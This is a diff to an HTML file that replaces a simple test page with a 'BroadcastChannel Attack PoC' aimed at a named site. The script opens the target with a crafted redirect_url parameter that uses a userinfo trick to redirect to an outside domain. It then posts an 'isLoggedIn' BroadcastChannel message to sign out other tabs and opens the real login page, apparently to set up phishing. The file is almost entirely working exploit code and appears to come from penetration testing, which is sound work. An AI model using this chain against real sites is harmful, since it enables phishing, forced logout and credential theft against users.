@@ -1,21 +1,33 @@
-
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="utf-8" />
-        <meta name="viewport" content="width=device-width,initial-scale=1" />
-        <title>Test Page</title>
-    </head>
-    <body>
-        <h1>Welcome to the Test Page</h1>
-        <p>This is a simple HTML page for testing purposes.</p>
-        <script>
-            console.log("Test Page Loaded");
-            const channel = new BroadcastChannel('cdd_vault_channel')
-                setTimeout(() => {
-                    // let other pages know that we are on the login page and so should sign out
-                    channel.postMessage('isLoggedIn')
-                })
-        </script>
-    </body>
+<head>
+    <meta charset="utf-8" />
+    <title>BroadcastChannel Attack PoC</title>
+</head>
+<body>
+    <h1>BroadcastChannel PoC</h1>
+    <p>This page will try to exploit BroadcastChannel timing.</p>
+
+    <script>
+        console.log("PoC Loaded");
+
+        // Create BroadcastChannel
+        const channel = new BroadcastChannel('cdd_vault_channel');
+
+        // Step 1: Open the vulnerable page with redirect_url param (this may load your payload or clone)
+        const firstWin = window.open("https://pentest.cdd.io/?redirect_url=https%3A%2F%2Fpentest.cdd.io%40daemoon.me");
+
+        // Step 2: Wait a few seconds, then send BroadcastChannel message
+        setTimeout(() => {
+            console.log("Sending BroadcastChannel message...");
+            channel.postMessage('isLoggedIn');
+        }, 3000); // wait 3s for the page to fully load and register the listener
+
+        // Step 3: Open the actual login page after message is sent
+        setTimeout(() => {
+            console.log("Opening real login page...");
+            window.open("https://pentest.cdd.io/user/session/new");
+        }, 5000); // wait 5s total (2s after message)
+    </script>
+</body>
 </html>
